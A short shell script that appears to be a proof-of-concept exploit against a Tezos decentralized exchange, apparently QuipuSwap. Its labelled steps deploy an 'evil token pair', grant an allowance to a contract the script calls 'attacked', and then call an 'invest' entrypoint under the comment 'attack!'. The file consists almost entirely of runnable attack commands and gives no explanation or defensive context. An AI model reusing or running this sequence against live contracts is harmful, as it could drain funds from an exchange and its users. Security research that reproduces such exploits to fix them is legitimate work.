#!/bin/sh

attacker=KT1JD8ZNP4Wq5iW24AKd7BzqHN1fmc5Yh1nN

attacked=KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7

# deploy evil token pair to Quipu
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1PgHxzUXruWG5XAahQzJAjkk4c2sPcM3Ca --entrypoint 'initializeExchange' --arg 'Pair  (Pair  (Pair (Pair (Left (Right Unit)) "KT1JD8ZNP4Wq5iW24AKd7BzqHN1fmc5Yh1nN")  (Pair 0 "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7"))  0)  (Pair 100 100)' --burn-cap 0.1

# allowance
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1JD8ZNP4Wq5iW24AKd7BzqHN1fmc5Yh1nN --entrypoint 'allow' --arg '"KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7"' --burn-cap 0.1

# attack!
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1JD8ZNP4Wq5iW24AKd7BzqHN1fmc5Yh1nN --entrypoint 'invest' --arg 'Pair (Pair 95 95) (Pair 95 "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7")'

# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1NkdTysHwwUVxqNUE45fNugXF8bFHRQk27 --entrypoint 'invest' --arg 'Pair (Pair 200 200) (Pair 200 "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7")'
